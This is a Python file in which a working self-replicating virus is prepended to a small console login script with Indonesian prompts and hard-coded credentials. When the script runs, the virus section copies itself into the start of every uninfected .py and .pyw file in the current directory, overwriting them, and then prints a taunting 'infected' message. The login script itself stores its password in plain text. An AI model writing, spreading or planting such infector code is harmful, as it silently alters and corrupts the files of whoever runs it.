# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
import os

correct_username = "User87827817873"
correct_password = "AMOGUS"

Auth = False
number_of_tries = 1
os.system("cls")
while not Auth:
    username = input("Masukan Username anda disini : ")
    password = input("Masukan password anda disini : ")
    if username == correct_username and password == correct_password:
        print(f"Selamat Datang Kembali {correct_username} ")
        Auth = True
    elif number_of_tries == 5:
        print("Maaf, Tapi sistem kami tidak bisa verifikasi bahwa anda pemilik akun ini")
        Auth = True
    else:
        print(f"Username anda atau password yang anda telah masukan salah, Percobaan yang anda telah lakukan: "
              f"{number_of_tries}")
        number_of_tries += 1